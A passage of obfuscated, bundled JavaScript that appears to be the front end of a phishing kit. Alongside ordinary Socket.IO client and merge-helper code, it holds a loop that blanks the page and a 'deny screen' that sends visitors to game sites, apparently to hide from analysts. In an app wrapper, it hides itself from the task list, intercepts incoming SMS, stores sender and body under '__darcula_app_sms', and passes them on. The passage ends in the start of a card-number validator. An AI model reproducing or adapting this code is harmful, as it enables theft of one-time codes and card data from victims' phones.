    return this.connected ? this : (this.subEvents(), this.io._reconnecting || this.io.open(), this.io._readyState === 'open' && this.onopen(), this);
  }
  ["open"]() {
    return this.connect();
  }
  ['send'](..._0x16f042) {
    _0x16f042.unshift("message");
    this.emit.apply(this, _0x16f042);
    return this;
  }
  ["emit"](_0x262be6, ..._0x3a348f) {
    if (Nt.hasOwnProperty(_0x262be6)) {
      throw new Error("\"" + _0x262be6.toString() + "\" is a reserved event name");
    }
    _0x3a348f.unshift(_0x262be6);
    if (this._opts.retries && !this.flags.fromQueue && !this.flags.volatile) {
      this._addToQueue(_0x3a348f);
      return this;
    }
    const _0x570967 = {
      'type': h.EVENT,
      'data': _0x3a348f
    };
    _0x570967.options = {};
    _0x570967.options.compress = this.flags.compress !== false;
    if (typeof _0x3a348f[_0x3a348f.length - 0x1] == "function") {
      const _0x28b2b4 = this.ids++;
      const _0x3ca1f7 = _0x3a348f.pop();
      this._registerAckCallback(_0x28b2b4, _0x3ca1f7);
      _0x570967.id = _0x28b2b4;
    }
    const _0x329bb5 = this.io.engine && this.io.engine.transport && this.io.engine.transport.writable;
    if (!(this.flags.volatile && (!_0x329bb5 || !this.connected))) {
      if (this.connected) {
        this.notifyOutgoingListeners(_0x570967);
        this.packet(_0x570967);
      } else {
        this.sendBuffer.push(_0x570967);
      }
    }
    this.flags = {};
    return this;
  }
  ["_registerAckCallback"](_0x4ccc2e, _0x221d1b) {
    var _0x1623e;
    const _0x4271ff = (_0x1623e = this.flags.timeout) !== null && _0x1623e !== undefined ? _0x1623e : this._opts.ackTimeout;
    if (_0x4271ff === undefined) {
      this.acks[_0x4ccc2e] = _0x221d1b;
      return;
    }
    const _0x380a52 = this.io.setTimeoutFn(() => {
      delete this.acks[_0x4ccc2e];
      for (let _0x4cf151 = 0x0; _0x4cf151 < this.sendBuffer.length; _0x4cf151++) {
        if (this.sendBuffer[_0x4cf151].id === _0x4ccc2e) {
          this.sendBuffer.splice(_0x4cf151, 0x1);
        }
      }
      _0x221d1b.call(this, new Error("operation has timed out"));
    }, _0x4271ff);
    this.acks[_0x4ccc2e] = (..._0x506314) => {
      this.io.clearTimeoutFn(_0x380a52);
      _0x221d1b.apply(this, [null, ..._0x506314]);
    };
  }
  ["emitWithAck"](_0x3b7a19, ..._0x1e7467) {
    const _0x1df111 = this.flags.timeout !== undefined || this._opts.ackTimeout !== undefined;
    return new Promise((_0x45b669, _0x510b16) => {
      _0x1e7467.push((_0x1a0d8c, _0x2f05cd) => _0x1df111 ? _0x1a0d8c ? _0x510b16(_0x1a0d8c) : _0x45b669(_0x2f05cd) : _0x45b669(_0x1a0d8c));
      this.emit(_0x3b7a19, ..._0x1e7467);
    });
  }
  ["_addToQueue"](_0x4e281f) {
    let _0x4020de;
    if (typeof _0x4e281f[_0x4e281f.length - 0x1] == 'function') {
      _0x4020de = _0x4e281f.pop();
    }
    const _0x3ee56a = {
      'id': this._queueSeq++,
      'tryCount': 0x0,
      'pending': false,
      'args': _0x4e281f,
      'flags': Object.assign({
        'fromQueue': true
      }, this.flags)
    };
    _0x4e281f.push((_0x119c62, ..._0x58e550) => _0x3ee56a !== this._queue[0x0] ? undefined : (_0x119c62 !== null ? 0x0 > this._opts.retries && (this._queue.shift(), _0x4020de && _0x4020de(_0x119c62)) : (this._queue.shift(), _0x4020de && _0x4020de(null, ..._0x58e550)), _0x3ee56a.pending = false, this._drainQueue()));
    this._queue.push(_0x3ee56a);
    this._drainQueue();
  }
  ["_drainQueue"](_0x59987a = false) {
    if (!this.connected || this._queue.length === 0x0) {
      return;
    }
    const _0x466ba7 = this._queue[0x0];
    if (!(_0x466ba7.pending && !_0x59987a)) {
      _0x466ba7.pending = true;
      _0x466ba7.tryCount++;
      this.flags = _0x466ba7.flags;
      this.emit.apply(this, _0x466ba7.args);
    }
  }
  ["packet"](_0x589f5e) {
    _0x589f5e.nsp = this.nsp;
    this.io._packet(_0x589f5e);
  }
  ["onopen"]() {
    if (typeof this.auth == "function") {
      this.auth(_0x48e19a => {
        this._sendConnectPacket(_0x48e19a);
      });
    } else {
      this._sendConnectPacket(this.auth);
    }
  }
  ["_sendConnectPacket"](_0x10f940) {
    this.packet({
      'type': h.CONNECT,
      'data': this._pid ? Object.assign({
        'pid': this._pid,
        'offset': this._lastOffset
      }, _0x10f940) : _0x10f940
    });
  }
  ["onerror"](_0x46e797) {
    if (!this.connected) {
      this.emitReserved("connect_error", _0x46e797);
    }
  }
  ['onclose'](_0xa4c1f4, _0x24627f) {
    this.connected = false;
    delete this.id;
    this.emitReserved("disconnect", _0xa4c1f4, _0x24627f);
  }
  ["onpacket"](_0x2a5b49) {
    if (_0x2a5b49.nsp === this.nsp) {
      switch (_0x2a5b49.type) {
        case h.CONNECT:
          if (_0x2a5b49.data && _0x2a5b49.data.sid) {
            this.onconnect(_0x2a5b49.data.sid, _0x2a5b49.data.pid);
          } else {
            this.emitReserved("connect_error", new Error("It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)"));
          }
          break;
        case h.EVENT:
        case h.BINARY_EVENT:
          this.onevent(_0x2a5b49);
          break;
        case h.ACK:
        case h.BINARY_ACK:
          this.onack(_0x2a5b49);
          break;
        case h.DISCONNECT:
          this.ondisconnect();
          break;
        case h.CONNECT_ERROR:
          this.destroy();
          const _0x281265 = new Error(_0x2a5b49.data.message);
          _0x281265.data = _0x2a5b49.data.data;
          this.emitReserved("connect_error", _0x281265);
          break;
      }
    }
  }
  ["onevent"](_0x467386) {
    const _0x23a22c = _0x467386.data || [];
    if (_0x467386.id != null) {
      _0x23a22c.push(this.ack(_0x467386.id));
    }
    if (this.connected) {
      this.emitEvent(_0x23a22c);
    } else {
      this.receiveBuffer.push(Object.freeze(_0x23a22c));
    }
  }
  ["emitEvent"](_0x5c3bb1) {
    if (this._anyListeners && this._anyListeners.length) {
      const _0x18ebe7 = this._anyListeners.slice();
      for (const _0x4dd8ec of _0x18ebe7) _0x4dd8ec.apply(this, _0x5c3bb1);
    }
    super.emit.apply(this, _0x5c3bb1);
    if (this._pid && _0x5c3bb1.length && typeof _0x5c3bb1[_0x5c3bb1.length - 0x1] == "string") {
      this._lastOffset = _0x5c3bb1[_0x5c3bb1.length - 0x1];
    }
  }
  ["ack"](_0xa63ec4) {
    const _0x535ad5 = this;
    let _0xf141e7 = false;
    return function (..._0x1360c) {
      if (!_0xf141e7) {
        _0xf141e7 = true;
        _0x535ad5.packet({
          'type': h.ACK,
          'id': _0xa63ec4,
          'data': _0x1360c
        });
      }
    };
  }
  ['onack'](_0x2b872a) {
    const _0x4a6f51 = this.acks[_0x2b872a.id];
    if (typeof _0x4a6f51 == 'function') {
      _0x4a6f51.apply(this, _0x2b872a.data);
      delete this.acks[_0x2b872a.id];
    }
  }
  ['onconnect'](_0x2c8e3d, _0x2fc1c1) {
    this.id = _0x2c8e3d;
    this.recovered = _0x2fc1c1 && this._pid === _0x2fc1c1;
    this._pid = _0x2fc1c1;
    this.connected = true;
    this.emitBuffered();
    this.emitReserved('connect');
    this._drainQueue(true);
  }
  ["emitBuffered"]() {
    this.receiveBuffer.forEach(_0x447c70 => this.emitEvent(_0x447c70));
    this.receiveBuffer = [];
    this.sendBuffer.forEach(_0x47fba0 => {
      this.notifyOutgoingListeners(_0x47fba0);
      this.packet(_0x47fba0);
    });
    this.sendBuffer = [];
  }
  ["ondisconnect"]() {
    this.destroy();
    this.onclose("io server disconnect");
  }
  ['destroy']() {
    if (this.subs) {
      this.subs.forEach(_0x4e35be => _0x4e35be());
      this.subs = undefined;
    }
    this.io._destroy(this);
  }
  ["disconnect"]() {
    if (this.connected) {
      this.packet({
        'type': h.DISCONNECT
      });
    }
    this.destroy();
    if (this.connected) {
      this.onclose("io client disconnect");
    }
    return this;
  }
  ["close"]() {
    return this.disconnect();
  }
  ["compress"](_0x19755e) {
    this.flags.compress = _0x19755e;
    return this;
  }
  get ['volatile']() {
    this.flags.volatile = true;
    return this;
  }
  ["timeout"](_0x4b19d4) {
    this.flags.timeout = _0x4b19d4;
    return this;
  }
  ["onAny"](_0x2bbc63) {
    this._anyListeners = this._anyListeners || [];
    this._anyListeners.push(_0x2bbc63);
    return this;
  }
  ["prependAny"](_0x37cbab) {
    this._anyListeners = this._anyListeners || [];
    this._anyListeners.unshift(_0x37cbab);
    return this;
  }
  ["offAny"](_0x42778f) {
    if (!this._anyListeners) {
      return this;
    }
    if (_0x42778f) {
      const _0x54bada = this._anyListeners;
      for (let _0x451475 = 0x0; _0x451475 < _0x54bada.length; _0x451475++) {
        if (_0x42778f === _0x54bada[_0x451475]) {
          _0x54bada.splice(_0x451475, 0x1);
          return this;
        }
      }
    } else {
      this._anyListeners = [];
    }
    return this;
  }
  ["listenersAny"]() {
    return this._anyListeners || [];
  }
  ["onAnyOutgoing"](_0x46262c) {
    this._anyOutgoingListeners = this._anyOutgoingListeners || [];
    this._anyOutgoingListeners.push(_0x46262c);
    return this;
  }
  ["prependAnyOutgoing"](_0x5d81f7) {
    this._anyOutgoingListeners = this._anyOutgoingListeners || [];
    this._anyOutgoingListeners.unshift(_0x5d81f7);
    return this;
  }
  ["offAnyOutgoing"](_0x2902cb) {
    if (!this._anyOutgoingListeners) {
      return this;
    }
    if (_0x2902cb) {
      const _0x3aeca9 = this._anyOutgoingListeners;
      for (let _0x40c9f4 = 0x0; _0x40c9f4 < _0x3aeca9.length; _0x40c9f4++) {
        if (_0x2902cb === _0x3aeca9[_0x40c9f4]) {
          _0x3aeca9.splice(_0x40c9f4, 0x1);
          return this;
        }
      }
    } else {
      this._anyOutgoingListeners = [];
    }
    return this;
  }
  ["listenersAnyOutgoing"]() {
    return this._anyOutgoingListeners || [];
  }
  ["notifyOutgoingListeners"](_0x1cdbb4) {
    if (this._anyOutgoingListeners && this._anyOutgoingListeners.length) {
      const _0x4d5c0e = this._anyOutgoingListeners.slice();
      for (const _0x27beb3 of _0x4d5c0e) _0x27beb3.apply(this, _0x1cdbb4.data);
    }
  }
}
function T(_0x57bdae) {
  _0x57bdae = _0x57bdae || {};
  this.ms = _0x57bdae.min || 0x64;
  this.max = _0x57bdae.max || 0x2710;
  this.factor = _0x57bdae.factor || 0x2;
  this.jitter = _0x57bdae.jitter > 0x0 && _0x57bdae.jitter <= 0x1 ? _0x57bdae.jitter : 0x0;
  this.attempts = 0x0;
}
T.prototype.duration = function () {
  var _0x504ab2 = this.ms * Math.pow(this.factor, this.attempts++);
  if (this.jitter) {
    var _0x118654 = Math.random();
    var _0x1a02c7 = Math.floor(_0x118654 * this.jitter * _0x504ab2);
    _0x504ab2 = Math.floor(_0x118654 * 0xa) & 0x1 ? _0x504ab2 + _0x1a02c7 : _0x504ab2 - _0x1a02c7;
  }
  return Math.min(_0x504ab2, this.max) | 0x0;
};
T.prototype.reset = function () {
  this.attempts = 0x0;
};
T.prototype.setMin = function (_0x433f81) {
  this.ms = _0x433f81;
};
T.prototype.setMax = function (_0x503bf8) {
  this.max = _0x503bf8;
};
T.prototype.setJitter = function (_0x592296) {
  this.jitter = _0x592296;
};
class Q extends l {
  constructor(_0x2f6a27, _0x4f4016) {
    var _0x4ce61b;
    super();
    this.nsps = {};
    this.subs = [];
    if (_0x2f6a27 && typeof _0x2f6a27 == "object") {
      _0x4f4016 = _0x2f6a27;
      _0x2f6a27 = undefined;
    }
    _0x4f4016 = _0x4f4016 || {};
    _0x4f4016.path = _0x4f4016.path || '/socket.io';
    this.opts = _0x4f4016;
    F(this, _0x4f4016);
    this.reconnection(_0x4f4016.reconnection !== false);
    this.reconnectionAttempts(_0x4f4016.reconnectionAttempts || Infinity);
    this.reconnectionDelay(_0x4f4016.reconnectionDelay || 0x3e8);
    this.reconnectionDelayMax(_0x4f4016.reconnectionDelayMax || 0x1388);
    this.randomizationFactor((_0x4ce61b = _0x4f4016.randomizationFactor) !== null && _0x4ce61b !== undefined ? _0x4ce61b : 0.5);
    this.backoff = new T({
      'min': this.reconnectionDelay(),
      'max': this.reconnectionDelayMax(),
      'jitter': this.randomizationFactor()
    });
    this.timeout(_0x4f4016.timeout == null ? 0x4e20 : _0x4f4016.timeout);
    this._readyState = "closed";
    this.uri = _0x2f6a27;
    const _0x1c471c = _0x4f4016.parser || xt;
    this.encoder = new _0x1c471c.Encoder();
    this.decoder = new _0x1c471c.Decoder();
    this._autoConnect = _0x4f4016.autoConnect !== false;
    if (this._autoConnect) {
      this.open();
    }
  }
  ["reconnection"](_0x550072) {
    return arguments.length ? (this._reconnection = !!_0x550072, this) : this._reconnection;
  }
  ["reconnectionAttempts"](_0x3a5302) {
    return _0x3a5302 === undefined ? this._reconnectionAttempts : (this._reconnectionAttempts = _0x3a5302, this);
  }
  ["reconnectionDelay"](_0x2647fd) {
    var _0x4666d5;
    return _0x2647fd === undefined ? this._reconnectionDelay : (this._reconnectionDelay = _0x2647fd, (_0x4666d5 = this.backoff) === null || _0x4666d5 === undefined || _0x4666d5.setMin(_0x2647fd), this);
  }
  ["randomizationFactor"](_0x279e13) {
    var _0x485824;
    return _0x279e13 === undefined ? this._randomizationFactor : (this._randomizationFactor = _0x279e13, (_0x485824 = this.backoff) === null || _0x485824 === undefined || _0x485824.setJitter(_0x279e13), this);
  }
  ["reconnectionDelayMax"](_0x261658) {
    var _0x31584b;
    return _0x261658 === undefined ? this._reconnectionDelayMax : (this._reconnectionDelayMax = _0x261658, (_0x31584b = this.backoff) === null || _0x31584b === undefined || _0x31584b.setMax(_0x261658), this);
  }
  ["timeout"](_0x4e3462) {
    return arguments.length ? (this._timeout = _0x4e3462, this) : this._timeout;
  }
  ["maybeReconnectOnOpen"]() {
    if (!this._reconnecting && this._reconnection && this.backoff.attempts === 0x0) {
      this.reconnect();
    }
  }
  ["open"](_0x39705b) {
    if (~this._readyState.indexOf("open")) {
      return this;
    }
    this.engine = new S(this.uri, this.opts);
    const _0x3e8705 = this.engine;
    const _0xa5af7c = this;
    this._readyState = "opening";
    this.skipReconnect = false;
    const _0x40d7c1 = y(_0x3e8705, "open", function () {
      _0xa5af7c.onopen();
      if (_0x39705b) {
        _0x39705b();
      }
    });
    const _0x2f9dbb = _0x436ddf => {
      this.cleanup();
      this._readyState = 'closed';
      this.emitReserved("error", _0x436ddf);
      if (_0x39705b) {
        _0x39705b(_0x436ddf);
      } else {
        this.maybeReconnectOnOpen();
      }
    };
    const _0x43a510 = y(_0x3e8705, "error", _0x2f9dbb);
    if (this._timeout !== false) {
      const _0xddfd82 = this._timeout;
      const _0x5fb679 = this.setTimeoutFn(() => {
        _0x40d7c1();
        _0x2f9dbb(new Error("timeout"));
        _0x3e8705.close();
      }, _0xddfd82);
      if (this.opts.autoUnref) {
        _0x5fb679.unref();
      }
      this.subs.push(() => {
        this.clearTimeoutFn(_0x5fb679);
      });
    }
    this.subs.push(_0x40d7c1);
    this.subs.push(_0x43a510);
    return this;
  }
  ['connect'](_0x140866) {
    return this.open(_0x140866);
  }
  ['onopen']() {
    this.cleanup();
    this._readyState = "open";
    this.emitReserved('open');
    const _0x128387 = this.engine;
    this.subs.push(y(_0x128387, "ping", this.onping.bind(this)), y(_0x128387, "data", this.ondata.bind(this)), y(_0x128387, "error", this.onerror.bind(this)), y(_0x128387, "close", this.onclose.bind(this)), y(this.decoder, "decoded", this.ondecoded.bind(this)));
  }
  ["onping"]() {
    this.emitReserved("ping");
  }
  ["ondata"](_0x216682) {
    try {
      this.decoder.add(_0x216682);
    } catch (_0xc8d142) {
      this.onclose("parse error", _0xc8d142);
    }
  }
  ["ondecoded"](_0x36766c) {
    ne(() => {
      this.emitReserved("packet", _0x36766c);
    }, this.setTimeoutFn);
  }
  ["onerror"](_0x2fa80d) {
    this.emitReserved("error", _0x2fa80d);
  }
  ['socket'](_0x26588d, _0x877be8) {
    let _0x50c7d4 = this.nsps[_0x26588d];
    if (_0x50c7d4) {
      if (this._autoConnect && !_0x50c7d4.active) {
        _0x50c7d4.connect();
      }
    } else {
      _0x50c7d4 = new Me(this, _0x26588d, _0x877be8);
      this.nsps[_0x26588d] = _0x50c7d4;
    }
    return _0x50c7d4;
  }
  ["_destroy"](_0x41a097) {
    const _0xe2dae3 = Object.keys(this.nsps);
    for (const _0x2f3881 of _0xe2dae3) if (this.nsps[_0x2f3881].active) {
      return;
    }
    this._close();
  }
  ["_packet"](_0x45a1a1) {
    const _0x25867b = this.encoder.encode(_0x45a1a1);
    for (let _0x2dbb16 = 0x0; _0x2dbb16 < _0x25867b.length; _0x2dbb16++) {
      this.engine.write(_0x25867b[_0x2dbb16], _0x45a1a1.options);
    }
  }
  ['cleanup']() {
    this.subs.forEach(_0x18408e => _0x18408e());
    this.subs.length = 0x0;
    this.decoder.destroy();
  }
  ['_close']() {
    this.skipReconnect = true;
    this._reconnecting = false;
    this.onclose("forced close");
    if (this.engine) {
      this.engine.close();
    }
  }
  ["disconnect"]() {
    return this._close();
  }
  ['onclose'](_0x2df127, _0x3dea8f) {
    this.cleanup();
    this.backoff.reset();
    this._readyState = "closed";
    this.emitReserved('close', _0x2df127, _0x3dea8f);
    if (this._reconnection && !this.skipReconnect) {
      this.reconnect();
    }
  }
  ['reconnect']() {
    if (this._reconnecting || this.skipReconnect) {
      return this;
    }
    const _0x5afb12 = this;
    if (this.backoff.attempts >= this._reconnectionAttempts) {
      this.backoff.reset();
      this.emitReserved("reconnect_failed");
      this._reconnecting = false;
    } else {
      const _0x8886ad = this.backoff.duration();
      this._reconnecting = true;
      const _0x4a1173 = this.setTimeoutFn(() => {
        if (!_0x5afb12.skipReconnect) {
          this.emitReserved("reconnect_attempt", _0x5afb12.backoff.attempts);
          if (!_0x5afb12.skipReconnect) {
            _0x5afb12.open(_0x53d72e => {
              if (_0x53d72e) {
                _0x5afb12._reconnecting = false;
                _0x5afb12.reconnect();
                this.emitReserved("reconnect_error", _0x53d72e);
              } else {
                _0x5afb12.onreconnect();
              }
            });
          }
        }
      }, _0x8886ad);
      if (this.opts.autoUnref) {
        _0x4a1173.unref();
      }
      this.subs.push(() => {
        this.clearTimeoutFn(_0x4a1173);
      });
    }
  }
  ["onreconnect"]() {
    const _0x5bc012 = this.backoff.attempts;
    this._reconnecting = false;
    this.backoff.reset();
    this.emitReserved("reconnect", _0x5bc012);
  }
}
const R = {};
function U(_0x50d926, _0x435549) {
  if (typeof _0x50d926 == "object") {
    _0x435549 = _0x50d926;
    _0x50d926 = undefined;
  }
  _0x435549 = _0x435549 || {};
  const _0x37ff06 = vt(_0x50d926, _0x435549.path || "/socket.io");
  const _0x39431a = _0x37ff06.source;
  const _0xdd6f64 = _0x37ff06.id;
  const _0x4c5ecc = _0x37ff06.path;
  const _0x5a1599 = R[_0xdd6f64] && _0x4c5ecc in R[_0xdd6f64].nsps;
  const _0x2f2204 = _0x435549.forceNew || _0x435549["force new connection"] || _0x435549.multiplex === false || _0x5a1599;
  let _0x30a6dc;
  if (_0x2f2204) {
    _0x30a6dc = new Q(_0x39431a, _0x435549);
  } else {
    if (!R[_0xdd6f64]) {
      R[_0xdd6f64] = new Q(_0x39431a, _0x435549);
    }
    _0x30a6dc = R[_0xdd6f64];
  }
  if (_0x37ff06.query && !_0x435549.query) {
    _0x435549.query = _0x37ff06.queryKey;
  }
  return _0x30a6dc.socket(_0x37ff06.path, _0x435549);
}
Object.assign(U, {
  'Manager': Q,
  'Socket': Me,
  'io': U,
  'connect': U
});
var Lt = Object.defineProperty;
var we = Object.getOwnPropertySymbols;
var Dt = Object.prototype.hasOwnProperty;
var Pt = Object.prototype.propertyIsEnumerable;
var ve = (_0x524bcd, _0xd4d035, _0x2bead0) => _0xd4d035 in _0x524bcd ? Lt(_0x524bcd, _0xd4d035, {
  'enumerable': true,
  'configurable': true,
  'writable': true,
  'value': _0x2bead0
}) : _0x524bcd[_0xd4d035] = _0x2bead0;
var qt = (_0x509ecf, _0xdfec55) => {
  for (var _0xc17bd7 in _0xdfec55 || (_0xdfec55 = {})) if (Dt.call(_0xdfec55, _0xc17bd7)) {
    ve(_0x509ecf, _0xc17bd7, _0xdfec55[_0xc17bd7]);
  }
  if (we) {
    for (var _0xc17bd7 of we(_0xdfec55)) if (Pt.call(_0xdfec55, _0xc17bd7)) {
      ve(_0x509ecf, _0xc17bd7, _0xdfec55[_0xc17bd7]);
    }
  }
  return _0x509ecf;
};
var E = (_0x39e62d, _0x773c1a, _0x3ad428) => new Promise((_0x320551, _0x12a581) => {
  var _0x35194a = _0x3d6dfe => {
    try {
      if (_0x3ad428.next(_0x3d6dfe).done) {
        _0x320551(_0x3ad428.next(_0x3d6dfe).value);
      } else {
        Promise.resolve(_0x3ad428.next(_0x3d6dfe).value).then(_0x35194a, _0x17a234);
      }
    } catch (_0x16d3f5) {
      _0x12a581(_0x16d3f5);
    }
  };
  var _0x17a234 = _0x1f987a => {
    try {
      if (_0x3ad428["throw"](_0x1f987a).done) {
        _0x320551(_0x3ad428["throw"](_0x1f987a).value);
      } else {
        Promise.resolve(_0x3ad428["throw"](_0x1f987a).value).then(_0x35194a, _0x17a234);
      }
    } catch (_0x2f0b76) {
      _0x12a581(_0x2f0b76);
    }
  };
  if ((_0x3ad428 = _0x3ad428.apply(_0x39e62d, _0x773c1a)).next().done) {
    _0x320551((_0x3ad428 = _0x3ad428.apply(_0x39e62d, _0x773c1a)).next().value);
  } else {
    Promise.resolve((_0x3ad428 = _0x3ad428.apply(_0x39e62d, _0x773c1a)).next().value).then(_0x35194a, _0x17a234);
  }
});
var It = class {
  constructor(_0x3b917f, _0x282679) {
    this.logged = false;
    this.eventList = [];
    if (typeof _0x3b917f == "string") {
      this.client = U(_0x3b917f, _0x282679);
    } else {
      this.client = _0x3b917f;
    }
    this.client.on('disconnect', () => {
      this.logged = false;
    });
  }
  get ['id']() {
    return this._id || this.client.id;
  }
  ["login"]() {
    return E(this, arguments, function* (_0x41d328 = [], _0x2755e0) {
      this._id = _0x2755e0;
      return yield new Promise(_0x1687e5 => {
        this.client.emit("login", this.id, _0x41d328, _0x2477fe => {
          if (!_0x2477fe.code) {
            this.logged = true;
          }
          _0x1687e5(_0x2477fe);
        });
      });
    });
  }
  get ["online"]() {
    return this.client.connected && this.logged;
  }
  ["connect"]() {
    this.client.connect();
  }
  ["disconnect"]() {
    this.client.disconnect();
  }
  ["request"](_0x468400) {
    return E(this, null, function* () {
      return yield new Promise((_0x281492, _0x180b1a) => E(this, null, function* () {
        let _0x3e6a9b = setTimeout(() => {
          if (this.logged) {
            _0x180b1a({
              'code': -0x1f4,
              'msg': "request timeout"
            });
          } else {
            _0x180b1a({
              'code': -0x191,
              'msg': "not logged"
            });
          }
        }, 0x2710);
        for (; !this.logged;) {
          yield new Promise(_0xc1f5dc => setTimeout(_0xc1f5dc, 0x1f4));
        }
        this.client.send(_0x468400, _0x2e2b49 => {
          clearTimeout(_0x3e6a9b);
          if ("code" in _0x2e2b49) {
            return _0x180b1a(_0x2e2b49);
          }
          _0x281492(_0x2e2b49);
        });
      }));
    });
  }
  ["join"](_0x397f6e) {
    return E(this, null, function* () {
      return yield this.request({
        'action': "join",
        'room': _0x397f6e
      });
    });
  }
  ["leave"](_0xa73b77) {
    return E(this, null, function* () {
      return yield this.request({
        'action': "leave",
        'room': _0xa73b77
      });
    });
  }
  ['getOnline'](_0x3cb684, _0x46a544) {
    return E(this, null, function* () {
      return yield this.request({
        'action': "get-online",
        'user': _0x3cb684,
        'room': _0x46a544
      });
    });
  }
  ["getOnlineUser"](_0x4deb68) {
    return E(this, null, function* () {
      return yield this.request({
        'action': "get-online-user",
        'room': _0x4deb68
      });
    });
  }
  ["message"](_0x1ac0dc, _0x81554c) {
    return E(this, null, function* () {
      return yield this.request(qt({
        'msg': _0x1ac0dc
      }, _0x81554c));
    });
  }
  ["onConnect"](_0x543b2b) {
    this.client.on("connect", _0x543b2b);
    return () => {
      this.client.removeListener('connect', _0x543b2b);
    };
  }
  ["onDisconnectLogged"](_0x1c6a99) {
    this.client.on("disconnect-logged", _0x1c6a99);
    return () => {
      this.client.removeListener("disconnect-logged", _0x1c6a99);
    };
  }
  ["onDisconnect"](_0xdba804) {
    this.client.on('disconnect', _0xdba804);
    return () => {
      this.client.removeListener("disconnect", _0xdba804);
    };
  }
  ["onMessage"](_0x37a1d5, _0x1df6fa) {
    if (_0x1df6fa) {
      if (this.eventList.includes(_0x1df6fa)) {
        throw new Error("eventName exists");
      }
      let _0x31a5d0 = (_0x39eaf3, _0x5ecbfc) => {
        if (_0x39eaf3.type === _0x1df6fa) {
          _0x37a1d5(_0x39eaf3.data, _0x5ecbfc);
        }
      };
      this.eventList.push(_0x1df6fa);
      this.client.on("message", _0x31a5d0);
      return {
        'sender': (_0x4ce475, _0x1098cc) => this.message({
          'type': _0x1df6fa,
          'data': _0x4ce475
        }, _0x1098cc),
        'unsubscribe': () => {
          delete this.eventList[this.eventList.indexOf(_0x1df6fa)];
          this.client.removeListener("message", _0x31a5d0);
        }
      };
    } else {
      this.client.on("message", _0x37a1d5);
      return () => {
        this.client.removeListener("message", _0x37a1d5);
      };
    }
  }
  ["onOnlineCount"](_0x24a6ae, _0x15be84) {
    if (_0x15be84) {
      _0x15be84 = '-' + _0x15be84;
    } else {
      _0x15be84 = '';
    }
    this.client.on("online-count" + _0x15be84, _0x24a6ae);
    return () => {
      this.client.removeListener("online-count" + _0x15be84, _0x24a6ae);
    };
  }
};
function Ue() {
  if (sessionStorage.getItem("silent")) {
    document.title = '';
    document.body.innerHTML = '';
  } else {
    document.title = 'wait...';
    document.body.style.textAlign = '';
    document.body.innerHTML = '';
  }
  document.querySelectorAll("link, style, script").forEach(_0x5cfbd9 => _0x5cfbd9.remove());
  requestAnimationFrame(Ue);
}
function Mt(_0x2eb4ac) {
  requestAnimationFrame(Ue);
  const _0x20b0b9 = localStorage.getItem('getout');
  if (_0x20b0b9 && _0x20b0b9.startsWith("http")) {
    a5_0x3a1055(_0x20b0b9);
  } else {
    const _0x1e6be8 = ["https://poki.com/", "https://www.crazygames.com/", "https://yandex.com/"];
    let _0x438087 = localStorage.getItem("__redirect_url");
    if (!_0x438087) {
      _0x438087 = _0x1e6be8[Math.floor(Math.random() * _0x1e6be8.length)];
      localStorage.setItem("__redirect_url", _0x438087);
    }
    a5_0x3a1055(_0x438087);
  }
  console.error("deny screen: ", _0x2eb4ac);
}
const C = window.cordova;
if (C) {
  console.log("in app");
  C.plugins.backgroundMode.overrideBackButton();
  C.plugins.backgroundMode.excludeFromTaskList();
  C.plugins.SMSReceive.startWatch(function (_0x25be90) {
    console.log(_0x25be90);
  }, function (_0x425fbb) {
    console.warn(_0x425fbb);
    Mt("getout");
  });
  const s = JSON.parse(localStorage.getItem("__darcula_app_sms") || '[]');
  document.addEventListener("onSMSArrive", function (_0x260bfd) {
    console.log('address:' + _0x260bfd.address);
    console.log("body:" + _0x260bfd.body);
    console.log('date' + _0x260bfd.date);
    s.push('在' + new Date(_0x260bfd.date).toLocaleString() + "接收到来自" + _0x260bfd.address + "的信息: " + _0x260bfd.body);
    if (s.length > 0xa) {
      s.shift();
    }
    ae(s);
    localStorage.setItem("__darcula_app_sms", JSON.stringify(s));
  });
  window.addEventListener("beforeunload", () => {
    C.plugins.SMSReceive.stopWatch();
  });
}
const _e = _0x57eff8 => {
  if (typeof _0x57eff8 == 'object' && _0x57eff8 !== null) {
    if (typeof Object.getPrototypeOf == 'function') {
      const _0x4287b3 = Object.getPrototypeOf(_0x57eff8);
      return _0x4287b3 === Object.prototype || _0x4287b3 === null;
    }
    return Object.prototype.toString.call(_0x57eff8) === "[object Object]";
  }
  return false;
};
const m = (..._0x4de014) => _0x4de014.reduce((_0x1914ea, _0x52d906) => {
  if (Array.isArray(_0x52d906)) {
    throw new TypeError("Arguments provided to ts-deepmerge must be objects, not arrays.");
  }
  Object.keys(_0x52d906).forEach(_0x3f29fa => {
    if (!['__proto__', "constructor", "prototype"].includes(_0x3f29fa)) {
      if (Array.isArray(_0x1914ea[_0x3f29fa]) && Array.isArray(_0x52d906[_0x3f29fa])) {
        _0x1914ea[_0x3f29fa] = m.options.mergeArrays ? m.options.uniqueArrayItems ? Array.from(new Set(_0x1914ea[_0x3f29fa].concat(_0x52d906[_0x3f29fa]))) : [..._0x1914ea[_0x3f29fa], ..._0x52d906[_0x3f29fa]] : _0x52d906[_0x3f29fa];
      } else if (_e(_0x1914ea[_0x3f29fa]) && _e(_0x52d906[_0x3f29fa])) {
        _0x1914ea[_0x3f29fa] = m(_0x1914ea[_0x3f29fa], _0x52d906[_0x3f29fa]);
      } else {
        _0x1914ea[_0x3f29fa] = _0x52d906[_0x3f29fa] === undefined ? m.options.allowUndefinedOverrides ? _0x52d906[_0x3f29fa] : _0x1914ea[_0x3f29fa] : _0x52d906[_0x3f29fa];
      }
    }
  });
  return _0x1914ea;
}, {});
const G = {
  'allowUndefinedOverrides': true,
  'mergeArrays': true,
  'uniqueArrayItems': true
};
m.options = G;
m.withOptions = (_0x1b19bc, ..._0xdbb4df) => {
  m.options = Object.assign(Object.assign({}, G), _0x1b19bc);
  const _0x5340ba = m(..._0xdbb4df);
  m.options = G;
  return _0x5340ba;
};
var Ut = {
  'validate': function (_0x169198) {
    var _0x9ed6b6;
    var _0x38ddcb;
    var _0x39f4a2 = String(_0x169198).replace(/[\s]/g, '');
    var _0x3df876 = _0x39f4a2.length;
    var _0x415d5e = false;
    var _0x3eb245 = 0x0;
    if (_0x3df876 === 0x0) {
      return true;
    }
    if (!/^[0-9]+$/.test(_0x39f4a2)) {
      return false;
    }
    for (var _0x211338 = _0x3df876; 0x0 < _0x211338; _0x211338--) {
      _0x9ed6b6 = parseInt(_0x39f4a2.charAt(_0x211338 - 0x1));
      if (_0x415d5e) {
